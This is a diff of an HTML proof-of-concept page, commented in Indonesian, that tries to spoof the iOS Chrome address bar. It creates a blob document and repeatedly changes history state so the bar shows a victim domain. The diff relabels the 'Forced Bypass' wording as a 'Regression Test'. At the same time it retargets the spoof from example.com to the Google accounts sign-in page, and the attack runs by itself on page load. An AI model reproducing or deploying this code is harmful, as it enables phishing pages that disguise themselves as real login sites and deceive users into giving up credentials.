@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Ultimate Hardened & Forced Bypass - iOS Chrome</title>
+    <title>PoC Ultimate Hardened & Regression Test - iOS Chrome</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,13 +48,13 @@
 </head>
 <body>
 
-    <h1>iOS Chrome Ultimate History Spoof PoC</h1>
-    <p>Menguji validasi origin pada <a href="https://chromium-review.googlesource.com/c/chromium/src/+/8291494" target="_blank">Change 8291494</a> dengan teknik *aggressive hammering* dan manipulasi state.</p>
+    <h1>iOS Chrome Regression Test PoC (Change 8291494)</h1>
+    <p>Menguji validasi asal URL berdasarkan <a href="https://chromium-review.googlesource.com/c/chromium/src/+/8291494" target="_blank">Change 8291494</a> dengan teknik <em>aggressive hammering</em>.</p>
 
     <div class="card">
-        <h3>1. Ultimate Launcher</h3>
+        <h3>1. Regression Launcher</h3>
         <p>Membuat objek blob mandiri dengan siklus pemicu pesan natif berkecepatan tinggi.</p>
-        <button id="launch-btn">Luncurkan PoC Sekarang</button>
+        <button id="launch-btn">Jalankan Uji Regresi</button>
         <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
@@ -64,19 +64,19 @@
     </div>
 
 <script>
-    const TARGET_VICTIM = "example.com";
+    const TARGET_VICTIM = "accounts.google.com";
 
     // Template HTML payload blob dengan hammering agresif
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Ultimate Hardened Target</title>
+<title>Regression Target</title>
 <style>
   body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
   h2 { color: #b31412; }
   #panel { display: none; padding: 10px; background: #e6f4ea; border: 1px solid #ceead6; margin-top: 10px; }
   pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Ultimate Sandbox Active</h2>
+<h2>Regression Sandbox Active</h2>
 <p>Asal Dokumen (Origin): <code id="origin"></code></p>
 <p>URL Saat Ini: <code id="cur-url"></code></p>
 
@@ -87,12 +87,12 @@
 (function(){
   function bLog(msg) {
     document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[UltimatePoC] ' + msg); } catch(e){}
+    try { console.log('[RegressionPoC] ' + msg); } catch(e){}
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
   document.getElementById('cur-url').textContent = location.href;
-  bLog('Blob dokumen ultimate berhasil dimuat.');
+  bLog('Blob dokumen regresi berhasil dimuat.');
 
   // Manipulasi pushState lokal
   try {
@@ -130,7 +130,7 @@
     return null;
   };
 
-  var spoofUrl = 'blob:https://' + "${TARGET_VICTIM}" + '/';
+  var spoofUrl = 'blob:https://' + "${TARGET_VICTIM}" + '/signin';
   bLog('Target spoof URL: ' + spoofUrl);
 
   // Hammering agresif berkecepatan tinggi (tiap 30ms)
@@ -161,17 +161,17 @@
       clearInterval(aggressiveHammer);
       bLog('\\n--- EVALUASI AKHIR ---');
       bLog('Periksa bilah alamat (Address Bar) Anda.');
-      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil.');
+      bLog('Jika menampilkan "' + "${TARGET_VICTIM}" + '": Bypass berhasil / Rentan.');
       bLog('Jika tetap menampilkan URL blob: Proteksi C++ aktif dan menolak state change.');
     }
   }, 30);
 })();
 <\/script>`;
 
-    function startUltimatePoC() {
+    function startRegressionPoC() {
         try {
             const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Mempersiapkan blob ultimate...\n";
+            diag.textContent += "[*] Mempersiapkan blob regresi...\n";
             
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
@@ -187,10 +187,10 @@
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', startUltimatePoC);
+    document.getElementById('launch-btn').addEventListener('click', startRegressionPoC);
 
     window.onload = function() {
-        setTimeout(startUltimatePoC, 400);
+        setTimeout(startRegressionPoC, 400);
     };
 </script>
 
